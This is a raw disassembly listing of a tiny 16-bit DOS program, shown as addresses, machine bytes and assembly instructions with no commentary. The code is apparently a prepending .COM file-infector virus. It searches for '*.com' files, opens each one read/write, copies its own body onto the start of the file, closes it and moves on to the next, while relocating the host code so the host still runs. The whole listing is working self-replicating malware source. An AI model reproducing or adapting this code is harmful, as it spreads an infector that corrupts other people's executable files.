0AF9:0100 8CC8          MOV     AX,CS
0AF9:0102 FEC4          INC     AH
0AF9:0104 8EC0          MOV     ES,AX
0AF9:0106 8BCE          MOV     CX,SI
0AF9:0108 8BF3          MOV     SI,BX
0AF9:010A 8BFB          MOV     DI,BX
0AF9:010C F3            REPZ
0AF9:010D A4            MOVSB
0AF9:010E 06            PUSH    ES
0AF9:010F 57            PUSH    DI
0AF9:0110 B163          MOV     CL,63
0AF9:0112 90            NOP
0AF9:0113 90            NOP
0AF9:0114 FEC5          INC     CH
0AF9:0116 87F1          XCHG    SI,CX
0AF9:0118 B9EEEE        MOV     CX,EEEE
0AF9:011B F3            REPZ
0AF9:011C A4            MOVSB
0AF9:011D B44E          MOV     AH,4E
0AF9:011F B15D          MOV     CL,5D
0AF9:0121 90            NOP
0AF9:0122 90            NOP
0AF9:0123 87D1          XCHG    DX,CX
0AF9:0125 FEC6          INC     DH
0AF9:0127 CD21          INT     21
0AF9:0129 7301          JNB     012C
0AF9:012B CB            RETF
0AF9:012C B8023D        MOV     AX,3D02
0AF9:012F 99            CWD
0AF9:0130 B29E          MOV     DL,9E
0AF9:0132 CD21          INT     21
0AF9:0134 93            XCHG    BX,AX
0AF9:0135 B43F          MOV     AH,3F
0AF9:0137 B263          MOV     DL,63
0AF9:0139 90            NOP
0AF9:013A 90            NOP
0AF9:013B FEC6          INC     DH
0AF9:013D 54            PUSH    SP
0AF9:013E 59            POP     CX
0AF9:013F CD21          INT     21
0AF9:0141 056300        ADD     AX,0063
0AF9:0144 90            NOP
0AF9:0145 50            PUSH    AX
0AF9:0146 B80042        MOV     AX,4200
0AF9:0149 99            CWD
0AF9:014A 33C9          XOR     CX,CX
0AF9:014C CD21          INT     21
0AF9:014E 59            POP     CX
0AF9:014F B440          MOV     AH,40
0AF9:0151 FEC6          INC     DH
0AF9:0153 CD21          INT     21
0AF9:0155 B43E          MOV     AH,3E
0AF9:0157 CD21          INT     21
0AF9:0159 B44F          MOV     AH,4F
0AF9:015B EBCA          JMP     0127
0AF9:015D 2A2E636F      SUB     CH,[6F63]
0AF9:0161 6D            DB      6D
0AF9:0162 00            DB      00

